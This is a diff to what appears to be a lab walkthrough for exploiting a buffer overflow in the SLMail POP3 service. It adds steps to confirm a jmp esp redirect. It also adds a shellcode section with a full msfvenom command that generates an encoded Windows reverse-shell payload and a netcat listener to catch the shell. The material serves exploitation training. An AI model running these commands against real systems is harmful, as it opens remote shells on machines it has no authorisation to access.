@@ -135,8 +135,25 @@
 
 15. Restart SLM and the debugger
 
-16. Now lets replace our EIP with the address we found, remember it's little endian so reverse it. You can see this in `pop3-sl-eiptest.py`.
+16. Now lets replace our EIP with the address we found, remember it's little endian so reverse it. You can see this in `pop3-sl-jumpconfimation.py`.
 
 17. Place a breakpoint on our `jmp esp` so we can confirm that it gets executed, this is done by going to the address and pressing `F2`
 
-18. Run our confirmation
+18. Run our confirmation script and we should hit our breakpoint pausing execution
+
+19. Press `F8` and it will execute `jmp esp` and move programme execution to our `C`s
+
+## SHELLCODE!
+1. Restart SLM and the debugger
+
+2. We will generate our shell code with `msfvenom`, using `msfvenom -p windows/shell_reverse_tcp LHOST=YO.UR.IP.AD LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
+
+3. This generates our shell payload and tells us how many bytes it is
+
+4. Enter this into our exploit, along with some buffer NOPS (16 `\x90`) to give our code some room to decode, you can see this exploit at `pop3-sl-fullexploit.py`
+
+5. Enter a breakpoint on our `jmp esp` so we can watch the shellcode execute and setup a listener using netcat `nc -lvp 443`
+
+6. Run the exploit, once the breakpoint is hit you can press `F8` to watch you exploit decode and execute. Click the play icon to run code
+
+7. You will eventually get a windows shell on your listener and you can confirm this by using `whoami`
